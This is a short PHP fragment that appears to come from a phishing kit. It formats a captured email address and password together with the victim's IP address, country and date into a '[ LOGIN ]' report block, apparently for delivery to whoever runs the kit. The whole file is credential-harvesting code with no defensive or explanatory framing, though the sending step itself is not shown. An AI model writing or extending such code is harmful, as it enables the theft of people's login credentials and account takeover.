<?php
require "timezone.php";
$message   = "
+============== [ LOGIN ] ==============+
Email	  :  ".$email."
Password  :  ".$password."
From      :  IP : ".$ip." | Country : ".$nama_negara." | Date : ".$v_date."
+============== [ LOGIN ] ==============+
";

?>